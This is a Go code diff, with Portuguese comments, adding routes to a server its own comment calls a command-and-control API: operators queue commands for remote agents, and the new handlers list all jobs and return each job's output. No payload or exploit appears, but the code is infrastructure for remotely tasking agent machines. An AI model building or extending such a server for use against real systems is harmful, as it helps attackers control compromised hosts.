@@ -30,6 +30,7 @@ type Repository interface {
 	GetJobForAgent(agentID string) (domain.JobRow, error) // Novo método
 	GetJob(id string) (domain.JobRow, error) 
 	UpdateJob(job domain.JobRow) error
+	GetAllJobs() ([]domain.JobRow, error) 
 }
 
 // ServerHTTP é a nossa API C&C
@@ -51,6 +52,8 @@ func (s *ServerHTTP) Router() http.Handler {
 	mux.HandleFunc("POST /api/jobs", s.handleReceiveCommand) // Nova rota do Operador
 	mux.HandleFunc("GET /api/agents/{agent_id}/job", s.handleFetchJobForAgent) // Nova rota para buscar comandos
 	mux.HandleFunc("POST /api/jobs/result", s.handleReceiveJobResult)
+	mux.HandleFunc("GET /api/jobs", s.handleSendAllJobResults)
+	mux.HandleFunc("GET /api/jobs/{job_id}/result", s.handleSendJobResult)
 	return mux
 }
 
@@ -158,4 +161,55 @@ func (s *ServerHTTP) handleReceiveJobResult(w http.ResponseWriter, r *http.Reque
 
 	// 5. Retorna sucesso (HTTP 200 OK)
 	w.WriteHeader(http.StatusOK)
+}
+
+// handleSendAllJobResults lista todos os comandos para o Operador
+func (s *ServerHTTP) handleSendAllJobResults(w http.ResponseWriter, r *http.Request) {
+	jobs, err := s.repo.GetAllJobs()
+	if err != nil {
+		http.Error(w, "Erro ao buscar comandos", http.StatusInternalServerError)
+		return
+	}
+
+	// Transformamos as Entidades em JSON (Array de DTOs)
+	var response []map[string]interface{}
+	for _, j := range jobs {
+		response = append(response, map[string]interface{}{
+			"id":          j.ID,
+			"agent_id":    j.AgentID,
+			"command":     j.Command,
+			"args":        j.Args,
+			"output":      j.Output,
+			"executed_at": j.ExecutedAt,
+		})
+	}
+
+	w.Header().Set("Content-Type", "application/json")
+	w.WriteHeader(http.StatusOK)
+	json.NewEncoder(w).Encode(response)
+}
+
+// handleSendJobResult devolve o output de um comando específico para o Operador
+func (s *ServerHTTP) handleSendJobResult(w http.ResponseWriter, r *http.Request) {
+	jobID := r.PathValue("job_id") // Extrai o ID da URL
+
+	job, err := s.repo.GetJob(jobID)
+	if err != nil {
+		http.Error(w, "Comando não encontrado", http.StatusNotFound)
+		return
+	}
+
+	// Preparamos o DTO de resposta do Resultado
+	response := map[string]interface{}{
+		"output": nil,
+	}
+
+	// Desreferenciamos o ponteiro de String com segurança, se o Agente já tiver respondido
+	if job.Output != nil {
+		response["output"] = *job.Output
+	}
+
+	w.Header().Set("Content-Type", "application/json")
+	w.WriteHeader(http.StatusOK)
+	json.NewEncoder(w).Encode(response)
 }
